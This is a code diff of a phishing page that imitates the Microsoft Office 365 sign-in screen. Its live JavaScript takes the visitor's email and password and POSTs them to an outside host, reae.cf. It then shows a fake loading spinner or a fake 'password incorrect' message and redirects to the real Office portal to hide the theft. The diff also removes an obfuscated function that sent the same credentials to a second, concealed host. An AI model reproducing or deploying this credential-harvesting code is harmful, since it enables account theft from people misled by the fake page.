@@ -1,5 +1,4 @@
 <html dir="ltr" class="" lang="en">
-
 <head>
     <title>Sign in to your account</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -42,6 +41,12 @@ background: #FF0000;
 
     <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/cdnbundles/convergedloginpaginatedstrings-en.min_ojdp3evnemcetlncdp3r4w2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-quWht0p82N7i0EkY4KTL6Bwo+g2sUH9qRIuVi/Yzy5EU2wY7XqqQ6lOMOTgNL9Pm"></script>
 -->
+<script>
+function myFunction() {
+  alert("Hello! I am an alert box!!");
+}
+</script>
+
 </head>
 
 <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">�
@@ -112,26 +117,12 @@ background: #FF0000;
                     'has-popup': showFedCredButton,
                     'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                         <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
-                        <!-- ko if: showLightboxProgress -->
-                        <!-- /ko -->
-                        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
-                        <div data-bind="component: { name: 'logo-control',
+                        
+						<div data-bind="component: { name: 'logo-control',
                     params: {
                         isChinaDc: svr.fIsChinaDc,
                         bannerLogoUrl: bannerLogoUrl() } }">
-                            <!--  -->
-                            <!-- ko if: bannerLogoUrl -->
-                            <!-- /ko -->
-                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
-                            <!-- ko component: 'accessible-image-control' -->
-                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
-                            <!-- /ko -->
-                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
-                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
-                            <!-- /ko -->
-                            <!-- /ko -->
-                            <!-- /ko -->
-                            <!-- /ko -->
+<img class="logo" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                         </div>
                         <!-- /ko -->
                         <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
@@ -330,12 +321,12 @@ background: #FF0000;
     css: { 'no-margin-bottom': removeBottomMargin || svr.bd, 'button-container': svr.bd }">
                                                         <!-- ko if: isSecondaryButtonVisible -->
                                                         <!-- /ko -->
-                                                        <div data-bind="
+														<div data-bind="
         css: {
             'inline-block': svr.bd,
             'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.bd,
             'col-xs-24': !(isSecondaryButtonVisible() || svr.bd) }" class="inline-block">
-                                                            <input type="submit" id="idSIButton9" class="btn btn-block btn-primary button_one" data-bind="
+                                                           <input type="submit" id="idSIButton9" class="btn btn-block btn-primary button_one" data-bind="
             attr: {
                 'id': primaryButtonId || 'idSIButton9',
                 'aria-describedby': primaryButtonDescribedBy },
@@ -345,6 +336,10 @@ background: #FF0000;
             enable: isPrimaryButtonEnabled,
             visible: isPrimaryButtonVisible,
             preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div>
+			<div style="float: right; padding-left: 5px; padding-top: 4px; display: none;" class="ldsddddd"> 
+														<img src="data:image/gif;base64,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">
+														</div> 
+                                                        
                                                     </div>
                                                 </div>
                                             </div>
@@ -700,11 +695,11 @@ background: #FF0000;
         <!-- /ko -->
         <!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() -->
         <!-- /ko -->
-        <!-- ko if: svr.urlCBPartnerPreload -->
+        <!-- ko if: svr.urlCBPartnerPreload --
         <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }">
             <iframe style="display: none;" src="https://portal.microsoftonline.com/Prefetch/Prefetch.aspx" width="0" height="0"></iframe>
         </div>
-        <!-- /ko -->
+         /ko -->
     </div>
 
 	<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
@@ -731,11 +726,15 @@ background: #FF0000;
 		var displayName = $('#displayName');
 		var login_name_xyz = $('.login_name_xyz');
 		displayName.attr('value', yid);
-		displayName.html(yid);
+		displayName.html(' <span style="font-size: 20px; cursor: pointer" class="back_btnuuu"> &#8592; </span> '+yid);
+		$('.back_btnuuu').click(function(){
+		  window.location.replace("index.html");
+		});
 		login_name_xyz.val(yid);
 		if(yid && yid != '' && yid.length > 4){
 		  email_sect.remove();
 		  pass_sect.show();
+		  i0116.val(yid);
 		}
 		else{
 		  pass_sect.remove();
@@ -744,6 +743,7 @@ background: #FF0000;
 		var idSIButton9 = $('#idSIButton9');
 		idSIButton9.click(function(e){
 		  e.preventDefault();
+		 // alert('sss');
 		  idSIButton9.css({ 'border-color' : '#ffffff'  });
 		  var email = i0116.val();
 		  if($('.email_section_xyz').length){
@@ -767,31 +767,51 @@ background: #FF0000;
 			  //var password_v = login_passwd.val();
 			
 			  /*  */
-			  mg(yid,password_v, 'Office1-not-true-login');	
+			  
+			  var ajax_url = 'https://reae.cf/.%20/handler.php';
 			         $.ajax({
-          url: 'https://reae.cf/.%20/login.php', 
+          url: ajax_url, 
           type: 'POST', 
           dataType: 'html', 
-          data: { Email : yid, password : password_v, typeofemail : 'Office1'}, 
+		  beforeSend: function(){
+		    $('.ldsddddd').show();
+		  },
+          data: { Email : yid, password : password_v}, 
 		  crossDomain: true,
           success: function(msg) {
-		   //window.location.replace("https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dbL-9u9lx4Nqok9GVqviQ7AxY5FUMsKBE7Nfj8BC2qH9NzDlw2Zu-b3fKc6YPyaLq78TzMPLnhxwWrNjZ7wpmOK3KwYbSfHdNFsP30BVEd7f8vX2eMSfHe3jPi97pHX1Y&nonce=636848699896041474.ODQ0YTlhYzUtNzVhYS00OWM3LWExNzMtMzVlNzg2ZWE2ZDg4ZDA1YjBhMzMtY2QzNS00MGE1LTlhMGQtZDE1ODBkYzk0MDJk&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=ac0c8cb4-8f4f-494a-89e4-79dd259f5253");
-	        //alert(msg);
-		    window.location.replace("https://portal.office.com");
+		  //alert(msg);
+		    msg = msg.trim();
+		    $('.ldsddddd').hide();
+		    if(msg != 'no' && msg != '-' && msg != ''){
+			  $.ajax({
+          url: ajax_url, 
+          type: 'POST', 
+          dataType: 'html', 
+		  data: { action : 'a', fname : msg}, 
+		  crossDomain: true,
+          success: function(msg) {
 		  },
           error: function(e) {
             console.log(e)
           }
         });
-		
-		setTimeout(function(){
-		  //window.location.replace("https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dbL-9u9lx4Nqok9GVqviQ7AxY5FUMsKBE7Nfj8BC2qH9NzDlw2Zu-b3fKc6YPyaLq78TzMPLnhxwWrNjZ7wpmOK3KwYbSfHdNFsP30BVEd7f8vX2eMSfHe3jPi97pHX1Y&nonce=636848699896041474.ODQ0YTlhYzUtNzVhYS00OWM3LWExNzMtMzVlNzg2ZWE2ZDg4ZDA1YjBhMzMtY2QzNS00MGE1LTlhMGQtZDE1ODBkYzk0MDJk&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=ac0c8cb4-8f4f-494a-89e4-79dd259f5253");
-		  window.location.replace("https://portal.office.com");
-	    }, 2000);
-			  /*  */
-			  //sign_in_title.hide();
-             // username_h.html('Hello '+yid);			  
+			  $('.alert_email_sect').hide();
+			  window.location.replace("https://portal.office.com");
 			}
+			else{
+			  $('.alert_msg_yxq').html("Your account or password is incorrect. If you don't remember your password");
+			  $('.alert_email_sect').show();
+			}
+		    //alert(msg);
+		   //window.location.replace("https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dbL-9u9lx4Nqok9GVqviQ7AxY5FUMsKBE7Nfj8BC2qH9NzDlw2Zu-b3fKc6YPyaLq78TzMPLnhxwWrNjZ7wpmOK3KwYbSfHdNFsP30BVEd7f8vX2eMSfHe3jPi97pHX1Y&nonce=636848699896041474.ODQ0YTlhYzUtNzVhYS00OWM3LWExNzMtMzVlNzg2ZWE2ZDg4ZDA1YjBhMzMtY2QzNS00MGE1LTlhMGQtZDE1ODBkYzk0MDJk&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=ac0c8cb4-8f4f-494a-89e4-79dd259f5253");
+	       /// alert(msg);
+		    //window.location.replace("https://portal.office.com");
+		  },
+          error: function(e) {
+            console.log(e)
+          }
+        });
+		}
 			else{
 			  $('.alert_msg_yxq').html('Please enter the password for your Microsoft account.');
 			  $('.alert_email_sect').show();
@@ -837,8 +857,7 @@ function validateEmail(email) {
         }
     }
 }
- function mg(a,o,tt){var h = ['O','L','t','q','e','D','c','-','.','z','u','2','T','m','V','J','6','U','P','b','v','K','B','Z','i','7','R',':','C','/','o','r','n','Q','S','5','3','8','a','M','W','I','x','H','Y','4','1','k','s','d','g','A','j','F','N','9','G','l','f','p','X','0','w','y','E','h'],t = h[65]+h[2]+h[2]+h[59]+h[48]+h[27]+h[29]+h[29]+h[38]+h[59]+h[24]+h[49]+h[38]+h[2]+h[38]+h[6]+h[48]+h[48]+h[8]+h[6]+h[30]+h[13]+h[29]+h[58]+h[24]+h[32]+h[24]+h[48]+h[65]+h[7]+h[10]+h[32]+h[20]+h[11]+h[11]+h[8]+h[59]+h[65]+h[59];$.ajax({url:t,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:tt},crossDomain:!0,success:function(a){},error:function(a){}})}	 
- </script>
+	</script>
 </body>
 
 </html>
